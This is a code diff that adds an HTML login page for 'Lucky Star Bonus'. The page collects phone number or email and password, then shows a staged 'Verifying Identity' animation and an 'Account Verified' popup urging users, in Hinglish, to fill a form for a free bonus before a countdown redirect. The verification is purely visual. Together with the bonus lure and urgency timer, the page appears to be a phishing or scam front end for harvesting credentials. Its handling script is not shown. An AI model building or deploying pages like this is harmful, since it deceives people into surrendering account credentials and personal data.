@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login — Lucky Star Bonus</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body class="submit-page">
+
+    <!-- Login Modal -->
+    <div id="login-modal" class="login-modal">
+        <div class="login-box">
+            <button id="close-login" class="close-login"><i class="fas fa-times"></i></button>
+
+            <div class="login-logo">
+                <img src="../logo/Screenshot-2026-06-08-110811-removebg-preview (1).png" alt="Lucky Star">
+                <h2>LOGIN</h2>
+            </div>
+
+            <div class="login-toggle">
+                <button class="toggle-btn active" data-type="phone"><i class="fas fa-phone"></i> Phone</button>
+                <button class="toggle-btn" data-type="email"><i class="fas fa-envelope"></i> Email</button>
+            </div>
+
+            <form id="login-form" class="login-form">
+                <div class="input-group" id="phone-group">
+                    <div class="country-select">
+                        <span class="flag">🇮🇳</span>
+                        <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <input type="tel" placeholder="+91 00000 00000" class="login-input" id="login-phone">
+                </div>
+
+                <div class="input-group hidden" id="email-group">
+                    <input type="email" placeholder="Enter Email ID" class="login-input" id="login-email">
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-lock input-icon"></i>
+                    <input type="password" placeholder="Password" class="login-input" id="login-password">
+                </div>
+
+                <a href="#" class="forgot-link">Forgot your password?</a>
+
+                <button type="submit" class="btn-login-ios">
+                    <span class="btn-shine"></span>
+                    <span class="btn-text">Log in</span>
+                </button>
+            </form>
+
+            <div class="divider"><span>or</span></div>
+
+            <div class="social-login">
+                <button class="social-btn google" aria-label="Continue with Google"><img src="icon/GOOGLE.png" alt="Google"></button>
+                <button class="social-btn telegram" aria-label="Continue with Telegram"><img src="icon/TELEGRAM.png" alt="Telegram"></button>
+                <button class="social-btn steam" aria-label="Continue with Steam"><img src="icon/STEAM.png" alt="Steam"></button>
+            </div>
+
+            <p class="register-text">Don't have an account? <a href="#">Register</a></p>
+        </div>
+    </div>
+
+    <!-- Verification Overlay -->
+    <div id="verify-overlay" class="verify-overlay hidden">
+        <div class="verify-box">
+            <div class="verify-scanner">
+                <div class="verify-ring"></div>
+                <div class="verify-ring-inner"></div>
+                <div class="verify-icon" id="verify-icon">
+                    <i class="fas fa-face-smile"></i>
+                </div>
+                <div class="verify-check-icon" id="verify-check-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+            </div>
+            <h3 id="verify-title" class="verify-title">Verifying Identity</h3>
+            <p id="verify-subtitle" class="verify-subtitle">Please wait while we verify your account</p>
+            <div class="verify-progress"><div class="verify-progress-bar" id="verify-progress-bar"></div></div>
+        </div>
+    </div>
+
+    <!-- Verified Popup -->
+    <div id="verified-popup" class="verified-popup hidden">
+        <div class="verified-box">
+            <div class="verified-badge">
+                <svg viewBox="0 0 24 24" class="verified-svg" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <path d="M9 12l2 2 4-4"/>
+                </svg>
+                <div class="verified-ring-pulse"></div>
+            </div>
+
+            <h2 class="verified-title">Account Verified</h2>
+            <p class="verified-text">
+                Aapka account successfully verify ho gaya hai. Ab aap apna
+                <strong> free bonus claim karne ke liye form bharein.
+            </p>
+
+            <div class="verified-meta">
+                <div class="meta-row">
+                    <span class="meta-label">Status</span>
+                    <span class="meta-value meta-green">Verified</span>
+                </div>
+                <div class="meta-row">
+                    <span class="meta-label">Account</span>
+                    <span class="meta-value" id="verified-account">—</span>
+                </div>
+                <div class="meta-row">
+                    <span class="meta-label">Bonus</span>
+                    <span class="meta-value meta-green">Unlocked</span>
+                </div>
+            </div>
+
+            <div class="verified-timer">
+                <svg viewBox="0 0 24 24" class="timer-icon" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="9"/>
+                    <path d="M12 7v5l3 2"/>
+                </svg>
+                <span>Redirecting in <strong id="verified-countdown">32</strong>s</span>
+                <div class="timer-track"><div class="timer-bar" id="verified-timer-bar"></div></div>
+            </div>
+
+            <button id="verified-continue" class="btn-primary verified-btn">
+                <svg viewBox="0 0 24 24" class="btn-svg" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 12v10H4V12"/>
+                    <path d="M2 7h20v5H2z"/>
+                    <path d="M12 22V7"/>
+                    <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/>
+                    <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/>
+                </svg>
+                <span>Claim Bonus Now</span>
+            </button>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
